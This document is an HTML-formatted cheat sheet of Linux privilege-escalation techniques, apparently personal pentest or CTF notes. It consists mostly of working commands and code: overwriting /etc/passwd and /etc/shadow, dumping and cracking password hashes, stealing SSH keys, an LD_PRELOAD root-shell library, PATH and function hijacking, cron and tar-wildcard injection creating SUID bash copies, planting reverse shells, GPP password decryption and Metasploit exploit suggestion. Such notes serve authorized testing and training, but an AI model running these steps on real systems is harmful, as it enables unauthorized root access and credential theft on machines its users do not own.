


<h2> Check local ports </h2> <br>
ss -lntu
<br>
If you see mongo running (27017 or 27020) see if can connect to mongo anon --- type on cli -- mongo <br>
<br>
<h2> share mount </h2>
<br>
showmount -e IP <br>
sudo mount -t nfs IP:/path/of/mount /mnt

<h2> World Writeable files </h2><br>
Check for files owned and executed as root writeable by anyone <br>
Find world writable folders:<br>
$ find / -perm -0002 -type d 2>/dev/null<br>
<br>
see if /etc/passwd is writeable --- ls -l /etc/passwd <br>
if it is, generate a new password with openssl passwd newpasshere <br>
copy and open etc/passwd paste into root user between first and 2nd :
![image](https://user-images.githubusercontent.com/35967437/202036336-b61520e1-717d-4d25-a6a3-8f53819ca2f1.png) <br>
<br>
Find writeable for current user<br>
$ find / -path /proc -prune -o -writable 2>/dev/null<br>
<br>

Find world writable files- exclude proc:<br>
$ find / -path /proc -prune -o -perm -0002 -type f 2>/dev/null<br>
<br>
Hidden or missed files in web directories:<br>
$ ls -alhR /var/www/
$ ls -alhR /var/www/html/
$ ls -alhR /srv/www/htdocs/
$ ls -alhR /usr/local/www/apache22/data/
$ ls -alhR /opt/lampp/htdocs/<br>
<br>
Web logs:<br>
$ cat /etc/httpd/logs/access_log
$ cat /etc/httpd/logs/access.log
$ cat /etc/httpd/logs/error_log
$ cat /etc/httpd/logs/error.log
$ cat /var/log/apache2/access_log
$ cat /var/log/apache2/access.log
$ cat /var/log/apache2/error_log
$ cat /var/log/apache2/error.log
$ cat /var/log/apache/access_log
$ cat /var/log/apache/access.log
$ cat /var/log/auth.log
$ cat /var/log/chttp.log
$ cat /var/log/cups/error_log
$ cat /var/log/dpkg.log
$ cat /var/log/faillog
$ cat /var/log/httpd/access_log
$ cat /var/log/httpd/access.log
$ cat /var/log/httpd/error_log
$ cat /var/log/httpd/error.log
$ cat /var/log/lastlog
$ cat /var/log/lighttpd/access.log
$ cat /var/log/lighttpd/error.log
$ cat /var/log/lighttpd/lighttpd.access.log
$ cat /var/log/lighttpd/lighttpd.error.log
$ cat /var/log/messages
$ cat /var/log/secure
$ cat /var/log/syslog
$ cat /var/log/wtmp
$ cat /var/log/xferlog
$ cat /var/log/yum.log
$ cat /var/run/utmp
$ cat /var/webmin/miniserv.log
$ cat /var/www/logs/access_log
$ cat /var/www/logs/access.log
$ ls -alh /var/lib/dhcp3/
$ ls -alh /var/log/postgresql/
$ ls -alh /var/log/proftpd/
$ ls -alh /var/log/samba/<br>
<br>
<h2>User enum</h2>
<br>
User folders<br>
Whoami<br>
Id<br>
/etc/passwd/<br>
Grep usernames - Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null<br>
<br>
Password and sensitive file hunting<br>
Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null<br>
Locate password | more<br>
<br>
History<br>
<br>
Ls -la then cat .bash_history<br>
<br>
Write contents of /etc/passwd and /etc/shadow to 2 diff files - then use tool called unshadow<br>
unshadow passwordfile.txt shadowfile.txt > unshadowed.txt<br>
(only works if access to shadow passwd) - ls -la /etc/shadow<br>
Then crack with hashcat -hashcat -m 1800 unshadowex.txt wordlist.txt -O<br>
Crack with John - john --wordlist=/home/kali/rockyou.txt hashname.txt<br>
<br>
See if /etc/shadow is writeable - ls -la /etc/shadow<br>
mkpasswd -m sha-512 yourpasswordhere<br>
<br>
<h2>Finding SSH Keys</h2><br>
find / -name authorized_keys 2> /dev/null<br>
find / -name id_rsa 2> /dev/null<br>
<br>
Should you find a rsa key - can get root shell with 2 commands<br>
Copy rsa key to file on attacking machine<br>
Run - chmod 400 rsakey<br>
Run ssh -i rsakey username@ip<br>
<br>
<h2>SUDO Priv Esc</h2><br>
see what a user has sudo rights too - sudo -l<br>
should it ask for a sudo password - user has no sudo rights<br>
<br>
Should stuff come up, take the names and search on gtfobins for sudo execution on the software<br>
<br>
<h2>SUID</h2><br>
Type find / -type f -perm -04000 -ls 2>/dev/null to see what software has SUID set<br>
use GTFO bins to look at software and see if any SUID exploits exist<br>
Find known exploits with SUID - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null<br>
Look for any version and google CVEs<br>
<br>
<br>
<h2>Sudo LD_Preload</h2><br>
Sudo -l look for LD_PRELOAD at the top (pre loads a library) (might say env_keep+=LD_PRELOAD)<br>
user may need to be in sudo file <br>
now browse to the /tmp directory <br>
Create a file named x.c<br>
#include <stdio.h><br>
#include <sys/types.h><br>
#include <stdlib.h><br>
void _init() {<br>
    unsetenv("LD_PRELOAD");<br>
    setgid(0);<br>
    setuid(0);<br>
    system("/bin/bash");<br>
}<br>
<br>
May need to do it with cat if not working<br>
cat << EOF >> x.c<br>
> #include <stdio.h><br>
> #include <sys/types.h><br>
> #include <stdlib.h><br>
> void _init() {<br>
> unsetenv("LD_PRELOAD");<br>
> setgid(0);<br>
> setuid(0);<br>
> system("/bin/bash");<br>
> }<br>
> EOF<br>
<br>
Save file as x.c<br>
Type <br>
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles<br>
Type <br>
sudo LD_PRELOAD=/tmp/x.so service you can run as sudo with sudo -l<br>
Type id<br>
<br>
<br>
<h2>Shared Object Injection</h2><br>
find / -type f -perm -04000 -ls 2>/dev/null<br>
Look for something we can inject (look at each path and see what each thing does, are they scripts?) Can use a tool called strace  ---- strace /location/to/path ---- <br>
have a look for errors such as missing files or directories<br>
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"<br>
Create the directory / file and add malicious code<br>
<br>
<br>
<h2>Capabilities</h2><br>
use command getcap to list capabilities - when run as unpriv user use getcap -r / 2>/dev/null<br>
serach on GTFO bins for any capabilities with the software names discovered<br>
<br>
<h2>Cron Jobs</h2><br>
Any user can read the file keeping system-wide cron jobs under /etc/crontab - cat /etc/crontab<br>
Edit any cron jobs that have permission and replace with a reverse shell using nano filename then edit. Ensure it runs as root.<br>
<br>
<br>
5 stars Means runs every minute<br>
Overwrite file with output such as <br>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh<br>
chmod +x ofcron.sh<br>
This will overwrite to tmp/bash and if you call /tmp/bash -p after the job has run it'll work<br>
<br>
Also check systemd timers ---- systemctl list-timers --all<br>
<br>
<h2>Cron Jobs with wildcard</h2><br>
Tar exploitation - when identifying cron jobs (cat /etc/crontab), there may be a job running using tar and a wildcard. You may have read only rights here.<br>
<br>
E.g. A script contains this<br>
cd important-directory<br>
tar cf /var/backups/backup.tar *<br>
<br>
First CD to the directory in the script<br>
Add a malicious file --- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > output.sh<br>
chmod +x output.sh<br>
touch  /directory/of/script--checkpoint=1<br>
touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh<br>
/tmp/bash -p (have to wait for script to be run on timer)<br>
<br>
<h2>Cron Jobs with overwrite</h2><br>
Check file perms of any cron jobs u find (ls -la filename.sh)<br>
If write permissions can overwrite file<br>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh<br>
<br>
<br>
<h2> checking processes running as root </h2> <br>
directory on my liniux called pspy <br>
start web server<br>
curl host and /pspy -o pspy <br>
chmod 777 pspy <br>
./pspy -d <br>
look for processes running as UID=0 that sound interesting and cat and take a look, see if you can edit, modify -- do this by running<br>
find / -name NAMEOFPROCESS 2>/dev/null <br>
Then check perms with ls -la or cat and see what you can do <br>
<br>
<h2>Path</h2><br>
find / -perm -u=s -exec ls -l {} \; 2>/dev/null<br>
Look for non linux binaries<br>
<br>
Or - find / -type f -perm -04000 -ls 2>/dev/null and look at binaries, run strings on the path -- strings /location/path and see if anything's interesting are there any system commands being called without a path defined? If so see if you can write a new PATH -export PATH=/tmp(change to the directory exploit is located):$PATH
To see current path type - echo "$PATH"<br>
<br>
1. In command prompt type:<br>
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c (making new c file malicious service and writing it to the tmp folder)<br>
2. In command prompt type: gcc /tmp/service.c -o /tmp/service   (outputting the file from C)<br>
3. In command prompt type: export PATH=/tmp:$PATH  (creating new path variable)<br>
4. In command prompt type: /usr/local/bin/suid-env   (this changes to whatever binary you identified)<br>
5. In command prompt type: id<br>
<br>
Another way<br>
Repeat the find step ( - find / -type f -perm -04000 -ls 2>/dev/nul) and look at binary strings, if there is a system command being called with a direct service you could try create a new function as that service<br>
<br>
E.g. If a binary has /usr/sbin/service apache 2 this shows it is reaching out to /usr/sbin to call the system command service. <br>
	1. Create a mew function with the path -- function /usr/sbin/service() {cp /bin/bash /tmp && chmpd +s /tmp/bash && /tmp/bash -p; }<br>
	2. Export - ---- export -f /usr/sbin/service (ovbs change to the system command u find)<br>
	3. Re -run the binary <br>
<br>
<br>
<h2>GPP Attacks</h2><br>
Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.<br>
Download if accessible via SMB by authing to smb - using mget command - mget * to download all files<br>
To decrypt cpassword - use tool call gpp-decrypt<br>
<br>
<br>
C code for priv esc<br>
int main() {<br>
        setuid(0);<br>
        system("/bin/bash -p");<br>
}<br>
<br>
Save as like service.c<br>
<br>
Then to compile run -- gcc -o service /path/of/file/service.c<br>
<br>

<h1>kernel exploits</h1>
if established session with MSFCONSOLE while sessions is established type use post/multi/recon/local_exploit_suggester 
now type set SESSION 1
identify vulnerability and type use exploitname set SESSION [meterpreter SESSION number] set LPORT run <br>
<br>

<h2>Further Paths </h2> <br>
if you find say a cron job or script referencing a system command e.g. cat, run env | grep PATH and take a look at the path. Then run which cat and see where this is being called from, e.g. /bin/cat. <br>
Run a command - touch /bin and see if you can read/write the directory, if so /mv /bin/cat /tmp <br>
Create new file named cat chmod +x cat and add reverse shell <br>
This will now be run everytime a cronjob or file references the system command. <br>
<br>
Run find / -perm -u=s -exec ls -l {} \; 2>/dev/null and look for non normal linux binary, e.g. /usr/bin/menu. Have a look if this runs as root. <br>
run strings on the full path - strings /usr/bin/menu and see what is happening, are there system commands being run? <br>
e.g. if curl is being run we can create a vulnerable version of curl. <br>
Create malicious version of curl in /tmp directory and add /tmp to path $ export - export PATH=/tmp:$PATH <br>
Execute the original binary e.g /usr/bin/menu <br>
This happens because path checks left to right every directory specified for the file, new added path directory is first on left

<h2> Cron paths </h2><br>
cat /etc/crontab <br>
look at the PATH value <br>
Create new file in path being called e.g /home/user <br>
add code<br>
#!/bin/bash<br>
<br>
cp /bin/bash /tmp/rootbash<br>
chmod +xs /tmp/rootbash<br>
<br>
add chmod +x file.sh <br>
wait for cronjob to run and run /tmp/rootbash -p <br>
<br>
<h2>editing service files </h2><br>
If you identify service files that are writeable by user (either with linpeas or ls -l lib/systemd/system> |grep null) and executed as root, edit in vim or nano and change path of file to /usr/bin/chmod +s /bin/bash <br>
save </br>
must have rights to reboot system -- sudo -l to check </br>
reboot and re-login via ssh<br>
execute /bin/bash -p <br>
